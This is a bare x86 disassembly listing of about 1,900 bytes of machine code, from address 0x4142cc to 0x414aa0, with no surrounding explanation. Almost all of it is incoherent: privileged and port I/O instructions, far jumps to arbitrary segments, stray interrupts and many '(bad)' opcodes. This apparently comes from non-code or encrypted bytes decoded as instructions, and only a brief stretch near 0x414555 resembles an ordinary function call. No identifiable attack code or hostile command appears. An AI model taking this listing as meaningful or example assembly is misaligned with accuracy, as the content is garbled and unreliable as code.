  4142cc:	inc    ecx
  4142cd:	mov    eax,ds:0xabac7037
  4142d2:	xor    edx,DWORD PTR [eax+0x40]
  4142d5:	sahf   
  4142d6:	and    BYTE PTR [esi-0x56],0x1c
  4142da:	in     al,0xec
  4142dc:	fld    QWORD PTR [ecx-0x5bd6e38c]
  4142e2:	jl     0x4142c6
  4142e4:	cld    
  4142e5:	xor    DWORD PTR [esi+0x794b33ba],esi
  4142eb:	mov    cl,0x3c
  4142ed:	cmp    eax,0xeeff9d92
  4142f2:	jmp    0x414338
  4142f4:	jg     0x414313
  4142f6:	jo     0x414328
  4142f8:	xor    bh,BYTE PTR [esi]
  4142fa:	jmp    0x7aa0:0xd1ed6f2e
  414301:	lods   al,BYTE PTR ds:[esi]
  414302:	ins    BYTE PTR es:[edi],dx
  414303:	inc    ebp
  414304:	sub    eax,0x5c1617dd
  414309:	sub    al,0x73
  41430b:	ret    0xc799
  41430e:	lahf   
  41430f:	cmp    dh,BYTE PTR [ebp-0x451bf5c7]
  414315:	dec    edi
  414316:	sti    
  414317:	ret    
  414318:	jle    0x41438a
  41431a:	adc    al,0xeb
  41431c:	xchg   BYTE PTR [ecx],bh
  41431e:	mov    al,ds:0xcda3558a
  414323:	cli    
  414324:	adc    esi,DWORD PTR [esi+0x39]
  414327:	xchg   esp,eax
  414328:	or     eax,0xdc722e29
  41432d:	div    BYTE PTR [edi]
  41432f:	adc    eax,0x444217e3
  414334:	test   eax,0x6734bf42
  414339:	je     0x414346
  41433b:	and    eax,0x5bf5306f
  414340:	sbb    al,0xab
  414342:	mov    DWORD PTR [esi],esp
  414344:	sub    ah,BYTE PTR [edi+0x7228526c]
  41434a:	add    BYTE PTR [esi],0xa7
  41434d:	int3   
  41434e:	mov    bh,BYTE PTR [esi-0x16]
  414351:	pop    esp
  414352:	in     al,0x70
  414354:	sti    
  414355:	push   0xffffffac
  414357:	xchg   edx,esp
  414359:	dec    esi
  41435a:	cli    
  41435b:	sub    al,0xa4
  41435d:	ret    
  41435e:	adc    ch,al
  414360:	inc    esp
  414361:	test   al,0xf9
  414363:	shl    DWORD PTR [ebx+0x11f703c4],0xff
  41436a:	xor    esi,DWORD PTR [esi+ecx*4]
  41436d:	or     bh,BYTE PTR [esi-0x64a4d94a]
  414373:	(bad)  [edx]
  414375:	and    dh,al
  414377:	add    al,dl
  414379:	dec    ebx
  41437a:	pop    ebp
  41437b:	sti    
  41437c:	rcl    BYTE PTR [edx+0xc96e58f],0xfa
  414383:	or     al,0xda
  414385:	or     cl,BYTE PTR [ebp-0x7bdb7b3e]
  41438b:	test   al,0xd2
  41438d:	movups xmm0,XMMWORD PTR [esi]
  414390:	repz xor eax,0x897be52e
  414396:	jl     0x414376
  414398:	pop    ds
  414399:	(bad)  
  41439a:	std    
  41439b:	jle    0x414396
  41439d:	pop    ds
  41439e:	std    
  41439f:	test   ebp,esp
  4143a1:	push   ebx
  4143a2:	sub    ah,bh
  4143a4:	lahf   
  4143a5:	jnp    0x414329
  4143a7:	add    al,0xdf
  4143a9:	mov    edi,0x932a1e74
  4143ae:	pop    ss
  4143af:	sbb    ebx,DWORD PTR [ebx+0x21d44da5]
  4143b5:	mov    DWORD PTR [ebx],esi
  4143b7:	leave  
  4143b8:	xchg   edi,eax
  4143b9:	adc    ebx,DWORD PTR [edi-0x2a]
  4143bc:	inc    ecx
  4143bd:	fmul   st,st(1)
  4143bf:	das    
  4143c0:	(bad)  
  4143c1:	pop    ebp
  4143c2:	jne    0x414405
  4143c4:	icebp  
  4143c5:	jae    0x41438d
  4143c7:	xchg   ebp,eax
  4143c8:	fs pop es
  4143ca:	lahf   
  4143cb:	ins    DWORD PTR es:[edi],dx
  4143cc:	pop    ebp
  4143cd:	pop    edx
  4143ce:	out    0x3,al
  4143d0:	das    
  4143d1:	push   ds
  4143d2:	mov    BYTE PTR [eax+ecx*1+0x2d],bl
  4143d6:	and    al,0x11
  4143d9:	push   esp
  4143da:	cli    
  4143db:	dec    ebx
  4143dc:	jmp    0xfb4a9604
  4143e1:	add    eax,0xc4063eef
  4143e6:	dec    eax
  4143e7:	dec    eax
  4143e8:	jbe    0x4143a0
  4143ea:	mov    dh,0xa7
  4143ec:	pushf  
  4143ed:	jae    0x4143b5
  4143ef:	xor    dl,BYTE PTR ds:[eax-0x18]
  4143f3:	mov    ch,BYTE PTR [ebx]
  4143f5:	or     BYTE PTR [edx+0x10],bl
  4143f8:	daa    
  4143f9:	adc    al,0x26
  4143fb:	call   FWORD PTR [esi-0x3f5458d6]
  414401:	or     eax,0x6b9041b4
  414406:	ja     0x414432
  414408:	lahf   
  414409:	(bad)  [ebx+0x260ab534]
  41440f:	jecxz  0x414474
  414411:	sbb    eax,DWORD PTR [edx+0x33]
  414414:	shl    BYTE PTR [ebp-0x551f5e79],cl
  41441a:	cmp    ah,cl
  41441c:	or     DWORD PTR [edi],esp
  41441e:	pop    ss
  41441f:	pusha  
  414420:	shl    BYTE PTR [ecx],0xaa
  414423:	cmc    
  414424:	arpl   si,di
  414426:	(bad)  
  414427:	sar    edx,cl
  414429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41442a:	outs   dx,BYTE PTR ds:[esi]
  41442b:	mov    esi,0xff3a186e
  414430:	mov    esp,0x60e387d6
  414435:	sub    DWORD PTR [ecx],edi
  414437:	and    edx,ecx
  414439:	mov    dl,0xa3
  41443b:	dec    esi
  41443c:	fwait
  41443d:	and    ch,BYTE PTR [esi+ebp*8]
  414440:	hlt    
  414441:	cdq    
  414442:	jnp    0x414409
  414444:	imul   eax,DWORD PTR [ecx-0x72],0x63
  414448:	push   eax
  414449:	das    
  41444a:	add    BYTE PTR [edi-0x59],bh
  41444d:	popf   
  41444e:	js     0x414428
  414450:	pop    si
  414452:	sub    cl,BYTE PTR [esi+0x6]
  414455:	pop    eax
  414456:	jge    0x414496
  414458:	aam    0xe
  41445a:	(bad)  
  41445b:	cli    
  41445c:	outs   dx,BYTE PTR ds:[esi]
  41445d:	loop   0x414490
  41445f:	clc    
  414460:	add    eax,0xda7bdf62
  414465:	sbb    ah,BYTE PTR [esp+ecx*2+0x695dbcc4]
  41446c:	pop    ebp
  41446d:	jb     0x4143fa
  41446f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414470:	push   cs
  414471:	mov    ch,BYTE PTR [ebx+0x6f91a132]
  414477:	inc    ebp
  414478:	call   0x487c96e3
  41447d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41447e:	hlt    
  41447f:	add    ch,ch
  414481:	add    eax,0x6b5ddf64
  414486:	push   DWORD PTR [ebp+0x35f03c23]
  41448c:	aam    0x9d
  41448e:	push   ss
  41448f:	scas   al,BYTE PTR es:[edi]
  414490:	int    0xb7
  414492:	jl     0x414459
  414494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414495:	int    0x97
  414497:	int    0x9e
  414499:	arpl   WORD PTR [edx+0x37af55ee],bx
  41449f:	ret    
  4144a0:	imul   edx,DWORD PTR [edi-0x53],0x72
  4144a4:	retf   0x1e1f
  4144a7:	and    BYTE PTR [ebp+ecx*8-0x424c9d0b],ch
  4144ae:	adc    al,0x6b
  4144b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144b1:	call   DWORD PTR [ecx]
  4144b3:	push   ds
  4144b4:	xchg   ebx,eax
  4144b5:	sub    eax,0x21fd2c76
  4144ba:	out    0xf4,eax
  4144bc:	dec    edx
  4144bd:	xchg   ebx,eax
  4144be:	aam    0x20
  4144c0:	sbb    ah,BYTE PTR ds:0x2e4dddf0
  4144c6:	inc    edi
  4144c7:	pop    eax
  4144c8:	call   0xa638c8e4
  4144cd:	daa    
  4144ce:	mov    BYTE PTR ds:0x66333ae1,dl
  4144d4:	jge    0x4144a2
  4144d6:	lahf   
  4144d7:	dec    esp
  4144d8:	daa    
  4144d9:	lea    edi,[ecx+0x66]
  4144dc:	pop    esp
  4144dd:	data16 shr ch,cl
  4144e0:	ja     0x414496
  4144e2:	mov    cl,0x22
  4144e4:	dec    ebp
  4144e5:	div    BYTE PTR cs:[ebx+0x38]
  4144e9:	jae    0x4144b1
  4144eb:	mov    bl,0xb0
  4144ed:	fimul  DWORD PTR [edi-0x17ee2188]
  4144f3:	mov    eax,0x6c357ce9
  4144f8:	ret    
  4144f9:	push   ds
  4144fa:	in     eax,0x6b
  4144fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144fd:	call   0xd613dda6
  414502:	out    dx,eax
  414503:	push   es
  414504:	and    eax,0x940d1798
  414509:	stos   BYTE PTR es:[edi],al
  41450a:	fs aad 0x80
  41450d:	push   ss
  41450e:	xlat   BYTE PTR ds:[ebx]
  41450f:	dec    eax
  414510:	or     al,0x48
  414512:	pop    ds
  414513:	fidivr DWORD PTR [edi+0x391836c8]
  414519:	leave  
  41451a:	popa   
  41451b:	in     al,dx
  41451c:	jmp    0x3ac55b73
  414521:	imul   esp,DWORD PTR [esi],0x1d3f1a5
  414527:	and    BYTE PTR [edx+edi*2-0x75],bl
  41452b:	sti    
  41452c:	fldenv [esi-0x5f]
  41452f:	test   eax,0xd8db8e3b
  414534:	popf   
  414535:	push   esp
  414536:	test   BYTE PTR [ebp-0x5fd4405e],bl
  41453c:	call   0x7299:0xe4d4d940
  414543:	and    cl,ah
  414545:	int3   
  414546:	outs   dx,DWORD PTR ds:[esi]
  414547:	xchg   dl,dl
  414549:	cmp    al,0xf6
  41454b:	xor    BYTE PTR [ebx+0x74563919],dl
  414551:	in     al,dx
  414552:	cli    
  414553:	add    ah,ch
  414555:	push   DWORD PTR [ebp-0x30]
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0x1a8dbeb4
  414576:	hlt    
  414577:	icebp  
  414578:	leave  
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x41454d
  414581:	mov    ds:0xf3f63f30,al
  414586:	jb     0x4145fc
  414588:	pop    esp
  414589:	jnp    0x41459e
  41458b:	out    0x3,al
  41458d:	adc    eax,0xece9f83
  414592:	adc    al,BYTE PTR [eax+0x33]
  414595:	sahf   
  414596:	pop    ecx
  414597:	popa   
  414598:	push   esp
  414599:	sub    DWORD PTR [esi],ebx
  41459b:	arpl   WORD PTR [eax-0x28],si
  41459e:	push   ecx
  41459f:	add    BYTE PTR [ecx+0x19],cl
  4145a2:	ins    DWORD PTR es:[edi],dx
  4145a3:	lock jne 0x41456c
  4145a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145a7:	es aad 0x12
  4145aa:	mov    eax,0x37c35813
  4145af:	bound  edi,QWORD PTR [ebx-0x303b96ee]
  4145b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145b6:	(bad)  
  4145b7:	(bad)  
  4145b8:	fisubr WORD PTR [esi+0x44201c21]
  4145be:	ret    0xf59a
  4145c1:	mov    ebp,0xfc2353cb
  4145c6:	shr    DWORD PTR [edx+ecx*8],1
  4145c9:	and    ah,0xc0
  4145cc:	add    ebx,0x5fde7731
  4145d2:	aas    
  4145d3:	push   ebx
  4145d4:	inc    BYTE PTR [bx+0x1c]
  4145d8:	iret   
  4145d9:	stos   BYTE PTR es:[edi],al
  4145da:	mov    dh,0xe3
  4145dc:	xlat   BYTE PTR ds:[ebx]
  4145dd:	daa    
  4145de:	and    DWORD PTR [edx],edx
  4145e0:	loopne 0x4145b3
  4145e2:	stos   BYTE PTR es:[edi],al
  4145e3:	mov    ch,0xfb
  4145e5:	scas   eax,DWORD PTR es:[edi]
  4145e6:	pop    edx
  4145e7:	dec    esp
  4145e8:	(bad)  
  4145e9:	cld    
  4145ea:	enter  0x2063,0x62
  4145ee:	xor    eax,0xf9a41559
  4145f3:	hlt    
  4145f4:	cmp    DWORD PTR [ebx+0x62b17568],0x30
  4145fb:	les    edx,FWORD PTR ss:[esi-0x6]
  4145ff:	aam    0xb3
  414601:	fcomp  st(2)
  414603:	push   cs
  414604:	and    cl,bh
  414606:	mov    ecx,0x9f6b315f
  41460b:	mov    ah,0x99
  41460d:	mov    edi,0x74b63bcb
  414612:	je     0x414606
  414614:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  414616:	sub    al,0x5d
  414618:	add    esp,DWORD PTR [ecx-0x72e87cc3]
  41461e:	mov    ?,WORD PTR [ecx+edx*1+0x1c6aea82]
  414625:	(bad)  [eax]
  414627:	push   eax
  414628:	out    dx,eax
  414629:	jbe    0x41467f
  41462b:	or     al,BYTE PTR [esi-0x640b3646]
  414631:	dec    edi
  414632:	push   cs
  414633:	push   edx
  414634:	jb     0x41460d
  414636:	jg     0x414610
  414638:	test   bl,ch
  41463a:	inc    ebx
  41463b:	and    eax,0xf1d5ef1f
  414640:	jecxz  0x4145f2
  414642:	inc    edi
  414643:	add    BYTE PTR [ebx-0x10],al
  414646:	(bad)  
  41464a:	std    
  41464b:	mov    bh,0x79
  41464d:	cs fwait
  41464f:	mov    ebp,0x83cb0a3f
  414654:	xchg   ebx,eax
  414655:	and    DWORD PTR [ebx-0x40ed5de1],0xffffffe0
  41465c:	pop    esp
  41465d:	xchg   ebp,ecx
  41465f:	fisubr WORD PTR [esi+0x15]
  414662:	cs cld 
  414664:	push   es
  414665:	cmp    al,0x32
  414667:	dec    esp
  414668:	pop    edi
  414669:	dec    esi
  41466a:	sbb    dh,BYTE PTR [ebx]
  41466c:	cdq    
  41466d:	dec    ebp
  41466e:	or     eax,0x247760ce
  414673:	cmp    DWORD PTR [esi],ebp
  414675:	push   ds
  414676:	or     DWORD PTR [ecx],0x53caf6a6
  41467c:	(bad)  
  41467d:	test   al,0xba
  41467f:	sahf   
  414680:	in     al,dx
  414681:	push   0x55
  414683:	pop    ebp
  414684:	mov    ds:0xefa28a7b,al
  414689:	push   esi
  41468a:	lods   al,BYTE PTR ds:[esi]
  41468b:	scas   al,BYTE PTR es:[edi]
  41468c:	fsubr  QWORD PTR [ecx]
  41468e:	sub    DWORD PTR [ecx],ebx
  414690:	pop    edi
  414691:	inc    eax
  414692:	aaa    
  414693:	cmp    ebx,DWORD PTR [edx+edi*1+0x532ee8b4]
  41469a:	and    BYTE PTR [edi-0x77],dl
  41469d:	std    
  41469e:	ds repnz test al,0x95
  4146a2:	sub    BYTE PTR [edx+0x6f],dh
  4146a5:	dec    ecx
  4146a6:	sahf   
  4146a7:	dec    ebp
  4146a8:	push   ebx
  4146a9:	or     al,BYTE PTR [ecx+edx*8-0x5e]
  4146ad:	mov    eax,ds:0xbc582111
  4146b2:	stos   DWORD PTR es:[edi],eax
  4146b3:	jmp    0x414731
  4146b5:	adc    bh,BYTE PTR [esi-0x19]
  4146b8:	jnp    0x4146dc
  4146ba:	add    BYTE PTR [ebp-0x737d7a5c],cl
  4146c0:	xchg   ecx,eax
  4146c1:	add    al,BYTE PTR [eax+0x60a0aa4f]
  4146c7:	stc    
  4146c8:	lahf   
  4146c9:	aas    
  4146ca:	out    dx,al
  4146cb:	loop   0x414714
  4146cd:	popa   
  4146ce:	out    0x63,eax
  4146d0:	dec    esi
  4146d1:	mov    edi,0x70e84ac9
  4146d6:	xor    DWORD PTR [eax+ebp*1+0x8],ebp
  4146da:	mov    BYTE PTR [eax+edx*8],dl
  4146dd:	fwait
  4146de:	dec    esp
  4146df:	jbe    0x4146c3
  4146e1:	fnstsw WORD PTR [eax]
  4146e3:	xchg   edx,eax
  4146e4:	jp     0x414698
  4146e6:	imul   ebx,DWORD PTR [edx+0x384ad9b7],0xe4d85382
  4146f0:	out    dx,eax
  4146f1:	dec    edx
  4146f2:	ins    DWORD PTR es:[edi],dx
  4146f3:	xchg   edi,eax
  4146f4:	jmp    0xd2c2974c
  4146f9:	or     eax,0xa278daa5
  4146fe:	pcmpeqd mm6,QWORD PTR [esi-0x5]
  414702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414703:	sbb    BYTE PTR [ecx],0x4
  414706:	jecxz  0x4146c0
  414708:	es dec eax
  41470a:	lds    edi,FWORD PTR [si]
  41470d:	sub    al,BYTE PTR [esi+0x18d5c0de]
  414713:	add    al,0x52
  414715:	shl    DWORD PTR [eax+ecx*1+0x1e8b768c],0x17
  41471d:	popf   
  41471e:	adc    al,0x28
  414720:	jmp    0x4146bd
  414722:	inc    ecx
  414723:	gs ins BYTE PTR es:[edi],dx
  414725:	dec    edi
  414726:	sbb    DWORD PTR [ecx-0x7864a690],ebx
  41472c:	(bad)  
  41472d:	mov    ecx,0xa5a3e381
  414732:	jmp    0x6ed5d3be
  414737:	cmc    
  414738:	loop   0x414785
  41473a:	sbb    BYTE PTR [esi+edx*8+0x27a89ae],bl
  414741:	xchg   edi,eax
  414742:	jae    0x4146d5
  414744:	sbb    al,0xb1
  414746:	inc    edi
  414747:	push   edi
  414748:	leave  
  414749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41474a:	mov    al,ds:0xb84e4630
  41474f:	push   edx
  414750:	inc    esp
  414751:	outs   dx,BYTE PTR ds:[esi]
  414752:	ss inc esi
  414754:	push   ecx
  414755:	test   DWORD PTR [ebx-0x21],eax
  414758:	cmc    
  414759:	mov    esi,0x3a146739
  41475e:	(bad)  
  41475f:	shl    dl,cl
  414761:	or     eax,0x8bb04193
  414766:	aam    0x11
  414768:	push   ebx
  414769:	add    eax,0x38a2712b
  41476e:	hlt    
  41476f:	imul   ecx,DWORD PTR [edi],0xc599ad7e
  414775:	push   cs
  414776:	es cwde 
  414778:	xchg   edi,eax
  414779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41477a:	repz in al,dx
  41477c:	call   0x7d47:0x3481a30c
  414783:	sbb    BYTE PTR [edi+0x69],cl
  414786:	xor    BYTE PTR [edi],ch
  414788:	cmovae edx,DWORD PTR [ecx]
  41478b:	mov    dh,0x3e
  41478d:	test   BYTE PTR [eax],ch
  41478f:	jne    0x4147e9
  414791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414792:	in     al,0xfb
  414794:	test   al,0x1f
  414796:	shr    BYTE PTR [edx-0x64],0x61
  41479a:	enter  0x2958,0x1d
  41479e:	inc    edi
  41479f:	aam    0x82
  4147a1:	or     al,0x71
  4147a3:	clc    
  4147a4:	push   ds
  4147a5:	int3   
  4147a6:	in     al,0xba
  4147a8:	cmp    eax,0x6c6bb3fd
  4147ad:	or     bh,dh
  4147af:	or     eax,0xe3b6cd1b
  4147b4:	jb     0x414811
  4147b6:	addr16 dec ecx
  4147b8:	push   esp
  4147b9:	int    0xfa
  4147bb:	(bad)  
  4147bc:	fisttp DWORD PTR [esi-0x5b95b66b]
  4147c2:	sub    DWORD PTR [edx],0x14
  4147c5:	adc    dl,BYTE PTR [edx+edi*8]
  4147c8:	mov    bl,BYTE PTR [eax*1+0x64d2ef8a]
  4147cf:	clc    
  4147d0:	arpl   WORD PTR [edx+0x49],si
  4147d3:	cs push ecx
  4147d5:	dec    edi
  4147d6:	add    ebp,DWORD PTR [edx+0xb]
  4147d9:	pusha  
  4147da:	mov    dh,BYTE PTR [ebx]
  4147dc:	fadd   DWORD PTR [ecx-0x74]
  4147df:	or     DWORD PTR [edi+0x13],0xa05eb492
  4147e6:	ficom  DWORD PTR [esi]
  4147e8:	mov    WORD PTR [ebp+0x72],es
  4147eb:	or     DWORD PTR [eax+eax*1-0x1d],edx
  4147ef:	test   al,0xc2
  4147f1:	mov    ecx,0xafbace10
  4147f6:	icebp  
  4147f7:	mov    eax,ds:0xaa1b328e
  4147fc:	fwait
  4147fd:	inc    edx
  4147fe:	int    0x4e
  414800:	and    BYTE PTR [edi-0x50],ch
  414803:	cmc    
  414804:	mov    ah,0x37
  414806:	leave  
  414807:	dec    esi
  414808:	mov    al,ds:0x8c7776a8
  41480d:	cmp    eax,0x6b1109aa
  414812:	fnstsw WORD PTR [edi]
  414814:	das    
  414815:	xor    edi,DWORD PTR [esi]
  414817:	adc    al,bl
  414819:	push   esp
  41481a:	mul    BYTE PTR [eax]
  41481c:	out    0xb6,eax
  41481e:	mov    esp,DWORD PTR [edx]
  414820:	rcr    esp,cl
  414822:	jg     0x4147f2
  414824:	mov    edx,ebx
  414826:	jmp    0x414896
  414828:	pusha  
  414829:	xchg   esi,eax
  41482a:	pusha  
  41482b:	aam    0x92
  41482d:	push   ss
  41482e:	data16 in al,0x99
  414831:	shl    DWORD PTR [edi],cl
  414833:	adc    BYTE PTR [esi-0x4f],dh
  414836:	lods   al,BYTE PTR ss:[esi]
  414838:	xor    eax,ebx
  41483a:	dec    esp
  41483b:	mov    eax,ecx
  41483d:	add    edx,DWORD PTR [edi+0x466725b6]
  414843:	fdecstp 
  414845:	iret   
  414846:	je     0x4147d3
  414848:	dec    ebp
  414849:	clc    
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414858
  414861:	ins    DWORD PTR es:[edi],dx
  414862:	div    BYTE PTR [ebx]
  414864:	adc    bh,BYTE PTR [ebp+0x7f]
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x41485d
  41486d:	cli    
  41486e:	inc    esp
  41486f:	pop    es
  414870:	in     al,dx
  414871:	stos   BYTE PTR es:[edi],al
  414872:	add    edx,DWORD PTR [eax-0x56]
  414875:	inc    esp
  414876:	push   eax
  414877:	aas    
  414878:	fcomp  DWORD PTR ds:0xd445b7f5
  41487e:	sub    ah,dl
  414880:	xchg   esp,eax
  414881:	pop    eax
  414882:	adc    eax,0x9b118df6
  414887:	ror    al,0x22
  41488a:	push   ebx
  41488b:	out    0x67,al
  41488d:	push   ds
  41488e:	lea    ebp,[ebx]
  414890:	dec    bx
  414892:	ja     0x4148d9
  414894:	mov    ?,WORD PTR [ecx-0x66c11d2c]
  41489a:	lahf   
  41489b:	mov    DWORD PTR [ebx-0x65414ba7],esp
  4148a1:	adc    bh,BYTE PTR [ebx-0x6d]
  4148a4:	adc    al,0xf3
  4148a6:	stos   BYTE PTR es:[edi],al
  4148a7:	pop    ds
  4148a8:	pop    ss
  4148a9:	inc    ecx
  4148aa:	mov    ah,0xb
  4148ac:	cmp    esi,esp
  4148ae:	add    eax,0x8b127008
  4148b3:	enter  0x9890,0xa3
  4148b7:	or     al,0x3d
  4148b9:	mov    eax,0xa8f2e084
  4148be:	in     eax,0xf2
  4148c0:	add    esp,edi
  4148c2:	mov    bl,bl
  4148c4:	push   ds
  4148c5:	aaa    
  4148c6:	out    dx,eax
  4148c7:	fild   QWORD PTR [edx+edx*1+0x572d4795]
  4148ce:	mov    ebx,0xce57b588
  4148d3:	dec    esi
  4148d4:	ss jo  0x41486f
  4148d7:	outs   dx,BYTE PTR ds:[esi]
  4148d8:	inc    edx
  4148d9:	ret    
  4148da:	sbb    DWORD PTR [ecx],eax
  4148dc:	outs   dx,BYTE PTR ds:[esi]
  4148dd:	adc    eax,0xf705eed6
  4148e2:	test   dh,cl
  4148e4:	add    eax,0xc38fdbc
  4148e9:	ret    0xb8c5
  4148ec:	sub    dl,BYTE PTR [ecx-0xa]
  4148ef:	jg     0x414939
  4148f1:	xchg   esp,eax
  4148f2:	or     bh,BYTE PTR [eax+0x11d79e10]
  4148f8:	in     eax,0x6d
  4148fa:	rol    cl,0x2e
  4148fd:	ret    
  4148fe:	mov    ecx,0x5bbbdf9f
  414903:	sub    al,0x3b
  414905:	fs dec esi
  414907:	mov    bh,0xda
  414909:	or     DWORD PTR [eax],ebp
  41490b:	mov    eax,0x9fd0c979
  414910:	lahf   
  414911:	pop    esi
  414912:	fidivr DWORD PTR [esi+eiz*1]
  414915:	cmp    al,0x67
  414917:	jbe    0x41489a
  414919:	aam    0xdc
  41491b:	cli    
  41491c:	(bad)  
  41491d:	fist   DWORD PTR [eax+0x146980b3]
  414923:	mov    DWORD PTR [esi],ecx
  414925:	xor    al,0x7
  414927:	sbb    eax,0x19e22892
  41492c:	sbb    BYTE PTR [ebp+0xe],ch
  41492f:	mov    ah,0xcd
  414931:	dec    eax
  414932:	jle    0x4148e7
  414934:	mov    ecx,0xb366129b
  414939:	jecxz  0x4148fe
  41493b:	or     al,0x55
  41493e:	xchg   ebp,eax
  41493f:	cli    
  414940:	jbe    0x41497d
  414942:	sbb    DWORD PTR [ebp-0x72e7050d],edi
  414948:	sbb    eax,0xcbdf03db
  41494d:	xchg   edx,eax
  41494e:	ins    DWORD PTR es:[edi],dx
  41494f:	and    edx,ebx
  414951:	dec    ebx
  414952:	scas   al,BYTE PTR es:[edi]
  414953:	pop    esp
  414954:	bound  esp,QWORD PTR [edx]
  414956:	mov    dl,0xd1
  414958:	sub    edx,DWORD PTR [edi+ecx*8+0x23b31b71]
  41495f:	scas   eax,DWORD PTR es:[edi]
  414960:	daa    
  414961:	(bad)  
  414962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414963:	sub    eax,0xcb80e159
  414968:	mov    cs,WORD PTR [esi-0x6c65cd24]
  41496e:	and    dl,al
  414970:	and    al,0x71
  414972:	add    dl,0x9e
  414975:	into   
  414976:	call   FWORD PTR [ebp-0x6]
  414979:	push   eax
  41497a:	sub    al,0xdb
  41497c:	cs or  eax,0xdcd748c8
  414982:	fs repnz pop ebp
  414985:	pop    ebx
  414986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414987:	pop    edi
  414988:	lods   al,BYTE PTR ds:[esi]
  414989:	in     al,0x75
  41498b:	sahf   
  41498c:	call   0xdfd0:0x4d3cc7c6
  414993:	mov    DWORD PTR [ebx+0x20],ecx
  414996:	cmp    al,0x3c
  414998:	adc    eax,0x9b9c592b
  41499d:	shl    dh,cl
  41499f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149a0:	inc    edx
  4149a1:	or     esp,ebx
  4149a3:	int    0xc6
  4149a5:	jbe    0x4149ad
  4149a7:	std    
  4149a8:	fbld   TBYTE PTR [ebp+0x56]
  4149ab:	call   0x27a0ff15
  4149b0:	(bad)  
  4149b1:	pop    ss
  4149b2:	inc    ebp
  4149b3:	call   0xfb38:0x1fd978ab
  4149ba:	sar    BYTE PTR [edi],1
  4149bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149bd:	(bad)  
  4149be:	in     al,0x6a
  4149c0:	add    al,0xd5
  4149c2:	nop
  4149c3:	pop    edx
  4149c4:	mov    edx,0x10dc4302
  4149c9:	stc    
  4149ca:	pop    esp
  4149cb:	call   FWORD PTR [esi+0x372bb13]
  4149d1:	jmp    0x414a0d
  4149d3:	cmp    BYTE PTR [ecx-0x17347ce7],dh
  4149d9:	pushf  
  4149da:	call   0xe226:0x5eafaa03
  4149e1:	mov    al,ds:0xaf79898a
  4149e6:	jmp    0x8a50:0xc24c1bfc
  4149ed:	test   DWORD PTR [ebx+0x370e8469],edi
  4149f3:	cli    
  4149f4:	enter  0x8a08,0x4d
  4149f8:	fnstenv [edx+ebx*1]
  4149fb:	shl    esp,cl
  4149fd:	inc    edi
  4149fe:	pop    ecx
  4149ff:	lock mov al,ds:0x44b1a974
  414a05:	sbb    al,0xf1
  414a07:	mov    DWORD PTR [esi-0x22c5ac55],ecx
  414a0d:	scas   eax,DWORD PTR es:[edi]
  414a0e:	cdq    
  414a0f:	xor    BYTE PTR [ebx],bh
  414a11:	mov    BYTE PTR [edx],bl
  414a13:	cmp    DWORD PTR [ecx-0x631f72ca],ebx
  414a19:	push   0x35
  414a1b:	pop    edi
  414a1c:	mov    esi,0x7cea5f77
  414a21:	lahf   
  414a22:	mul    DWORD PTR [ecx+0x6bb710a0]
  414a28:	inc    ebx
  414a29:	mov    al,0xe3
  414a2b:	test   al,0xaa
  414a2d:	fisub  WORD PTR [edx-0x5cc624da]
  414a33:	pop    ss
  414a34:	shr    ecx,1
  414a36:	mov    ebx,0xe6fa397b
  414a3b:	adc    bh,BYTE PTR [edi]
  414a3d:	test   ecx,0x7d0c8a19
  414a43:	sub    esp,DWORD PTR [edx-0x76cc8105]
  414a49:	mov    edi,0x18bad73e
  414a4e:	mov    BYTE PTR ds:0x2a6f1921,dh
  414a54:	cmc    
  414a55:	test   al,0x42
  414a57:	(bad)  
  414a59:	ins    BYTE PTR es:[edi],dx
  414a5a:	inc    ebx
  414a5b:	pop    edi
  414a5c:	dec    edi
  414a5d:	out    dx,al
  414a5e:	inc    edi
  414a5f:	out    dx,eax
  414a60:	cmp    DWORD PTR [ebp-0x33ac9426],esp
  414a66:	(bad)
  414a6b:	(bad)  
  414a6c:	xchg   esi,eax
  414a6d:	pop    es
  414a6e:	sti    
  414a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a70:	adc    bl,BYTE PTR [edi-0x6b560e6e]
  414a76:	xor    DWORD PTR [eax+0x50],0x7a021fe4
  414a7d:	or     eax,0xce75ea04
  414a82:	inc    esi
  414a83:	adc    eax,0x779391b
  414a88:	sbb    al,BYTE PTR [esi+0x5e]
  414a8b:	mov    dh,bl
  414a8d:	inc    eax
  414a8e:	xor    edx,edx
  414a90:	stos   BYTE PTR es:[edi],al
  414a91:	adc    BYTE PTR [edx],0x63
  414a94:	inc    edx
  414a95:	mov    cl,0x5c
  414a97:	adc    BYTE PTR [ecx],dh
  414a99:	mov    al,ds:0x144574b1
  414a9e:	xor    al,bl
  414aa0:	and    edi,DWORD PTR [ebx+0x7]
